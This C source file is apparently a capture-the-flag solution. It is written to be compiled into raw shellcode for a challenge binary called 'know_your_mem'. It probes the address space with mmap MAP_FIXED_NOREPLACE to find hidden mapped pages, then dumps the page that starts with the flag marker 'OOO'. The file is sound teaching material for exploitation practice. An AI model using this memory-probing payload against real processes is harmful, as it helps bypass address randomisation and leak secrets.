// This is an example of turning simple C into raw shellcode.

// make shellcode.bin will compile to assembly
// make shellcode.bin.pkt will prepend the length so you can
//    ./know_your_mem < shellcode.bin.pkt

// Note: Right now the 'build' does not support .(ro)data
//       If you want them you'll have to adjust the Makefile.
//       They're not really necessary to solve this challenge though.


// From https://chromium.googlesource.com/linux-syscall-support/
static int my_errno = 0;
#define SYS_ERRNO my_errno
#include "linux-syscall-support/linux_syscall_support.h"
#include <sys/mman.h>


#define ADDR_MIN   0x0000100000000000UL
#define ADDR_MASK  0x00000ffffffff000UL

#define MAX_MAP_SIZE 0x4000000UL

typedef struct range_e 
{
    void* addr;
    unsigned long range;
} range_t;


void _start()
{

    void* found_pages[100];
    int found_size=0;

    range_t ghetto_stack[100000];
    int stack_size;
    //char* start = "starting";
    //sys_write(1, start, 6);
    for(long i=0; i<2 * ADDR_MIN / MAX_MAP_SIZE; i++){
        range_t range = {.addr=(void*)(ADDR_MIN + i*MAX_MAP_SIZE), .range=MAX_MAP_SIZE};
        //search(range);
        ghetto_stack[stack_size++] = range;
        while(stack_size > 0)
        {
            range_t current = ghetto_stack[--stack_size];//pop();

            //printf("stack size: %d, calling search with addr, range: (%p, %p)\n", stack_size, current.addr, current.range);
            void* ret = sys_mmap(current.addr, current.range, PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE , -1, 0);
            if(ret != (void*) -1)
            {
                sys_munmap(current.addr, current.range);
                // the map succeded, so nothing here
                continue;
            }
            else
            {
                if(current.range == 4096)
                {
                    // found a hit
                    //printf("found mapped page %p with errno %d\n", range.addr, errno);
                    found_pages[found_size++] = current.addr;
                    continue;
                }
                else 
                {
                    range_t left_range = {current.addr, current.range/2};
                    range_t right_range = {current.addr + current.range/2, current.range/2};
                    ghetto_stack[stack_size++] = left_range;
                    ghetto_stack[stack_size++] = right_range;
                    continue;
                }
            }
        }
    }
    //printf("found %d pages\n", size);
    for(int i=0; i<found_size; i++)
    {
        char* page_ptr = (char*) found_pages[i];
        if( page_ptr[0] == 'O' && 
        page_ptr[1] == 'O' && 
        page_ptr[2] == 'O')
        {
            sys_write(1, found_pages[i], 4096);
            sys_exit_group(2);                            // Exit
        }
    }
    sys_exit_group(2);                            // Exit
}
